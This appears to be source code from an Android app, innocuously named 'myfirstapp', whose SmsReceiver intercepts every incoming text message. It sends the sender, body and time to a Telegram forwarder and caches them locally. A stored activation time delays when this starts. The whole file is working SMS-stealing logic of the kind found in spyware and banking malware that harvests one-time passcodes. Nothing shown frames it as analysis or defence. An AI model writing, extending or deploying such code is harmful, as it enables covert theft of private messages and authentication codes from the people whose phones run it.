package com.dev.test.myfirstapp.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import com.dev.test.myfirstapp.forwarders.TelegramForwarder;
import com.dev.test.myfirstapp.storage.SmsCache;

public class SmsReceiver extends BroadcastReceiver {
    private static final String PREFS_NAME = "app_prefs";

    @Override
    public void onReceive(Context context, Intent intent) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        long activationTime = prefs.getLong("activation_time", 0);

        if (System.currentTimeMillis() < activationTime) return;
        if (!Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) return;

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null || pdus.length == 0) return;

        for (Object pdu : pdus) {
            SmsMessage sms = createSmsMessage(pdu, bundle);
            if (sms == null) continue;

            String sender = sms.getDisplayOriginatingAddress();
            String body = sms.getDisplayMessageBody();
            long timestamp = sms.getTimestampMillis();

            if (body == null || body.isEmpty()) continue;

            String smsData = "📱 SMS Received\nFrom: " + sender + "\nTime: " +
                new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                .format(new java.util.Date(timestamp)) + "\nBody: " + body;

            TelegramForwarder.forwardSms(context, smsData);
            SmsCache.cacheSms(context, sender, body, timestamp);
        }
    }

    private SmsMessage createSmsMessage(Object pdu, Bundle bundle) {
        try {
            String format = bundle.getString("format");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                return SmsMessage.createFromPdu((byte[]) pdu, format);
            } else {
                return SmsMessage.createFromPdu((byte[]) pdu);
            }
        } catch (Exception e) {
            return null;
        }
    }
}